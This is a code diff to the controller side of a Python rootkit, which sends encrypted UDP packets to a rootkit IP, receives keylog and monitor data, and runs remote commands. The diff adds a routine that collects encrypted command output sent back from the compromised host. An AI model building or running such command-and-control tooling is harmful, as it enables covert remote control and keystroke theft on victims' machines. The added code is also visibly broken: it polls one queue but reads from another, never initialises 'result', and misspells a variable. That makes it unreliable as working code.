@@ -12,7 +12,7 @@ filterwarnings("ignore")
 import argparse
 from multiprocessing import Process, SimpleQueue
 from ipaddress import ip_address, IPv6Address
-from sys import exit
+from sys import exit, maxsize
 from time import sleep
 
 # Custom Modules
@@ -52,6 +52,7 @@ CONTROLLER_IP = ARGS.controller_ip
 ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 QUEUE = SimpleQueue()
+COMMAND_OUTPUT_QUEUE = SimpleQueue()
 STREAM_ENCRYPTION_HANDLER = StreamEncryption()
 BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
 MONITOR_IDENTIFICATION = 14562
@@ -90,7 +91,7 @@ def subprocess_packet_handler(pkt):
     if pkt[IP].id == MONITOR_IDENTIFICATION:
         write_monitor_data(encrypted_message)
     if pkt[IP].id == COMMAND_OUTPUT_IDENTIFICATION:
-        pass
+        QUEUE.put(encrypted_message)
 
 
 def write_keylog_data(data):
@@ -146,6 +147,32 @@ def receive_single_response():
     print("Timed out waiting for response...")
 
 
+def receive_command_output():
+    attempts = 0
+    bytes_received = 0
+    bytes_expected = maxsize
+    command_output = ""
+    while attempts < 3 and bytes_received < bytes_expected:
+        if COMMAND_OUTPUT_QUEUE.empty():
+            attempts += 1
+            sleep(1)
+            continue
+        else:
+            encrypted = QUEUE.get()
+            decrypted = BLOCK_ENCRYPTION_HANDLER.decrypt(encrypted)
+            attempts = 0
+            if "NUM_BYTES:" in decrypted:
+                parts = decrypted.split(" ")
+                parts = parts[0].split(":")
+                bytes_expected = int(parts[1])
+            bytes_received += len(decrypted)
+            result += decryped
+    if attempts == 3:
+        print("Timed out waiting for response...")
+    else:
+        print(result)
+
+
 def arg_list_to_string(args: list):
     result = ""
     for arg in args:
@@ -195,6 +222,7 @@ if __name__ == "__main__":
         if argv[0] == EXECUTE:
             data = argv[0] + " " + arg_list_to_string(argv[1:])
             send_udp(data)
+            receive_command_output()
         else:
             print(f"Invalid Command: {command}")
     decode_process.kill()
